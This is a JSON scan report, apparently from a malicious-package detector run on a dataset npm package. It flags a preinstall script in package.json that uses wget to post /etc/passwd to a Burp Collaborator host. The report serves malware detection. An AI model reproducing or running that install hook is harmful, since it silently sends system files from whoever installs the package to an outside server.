@@ -1,0 +1,28 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:7",
+                "code": "    \"preinstall\": \"wget -q --post-file=/etc/passwd \\\"http://ppibzr56t0md481b1o5gcx3xgommab.burpcollaborator.net\\\"\",\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": {},
+        "shady-links": [
+            {
+                "location": "package/package.json:7",
+                "code": "    \"preinstall\": \"wget -q --post-file=/etc/passwd \\\"http://ppibzr56t0md481b1o5gcx3xgommab.burpcollaborator.net\\\"\",\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/internal_pkg_for_dc-1.0.9"
+}
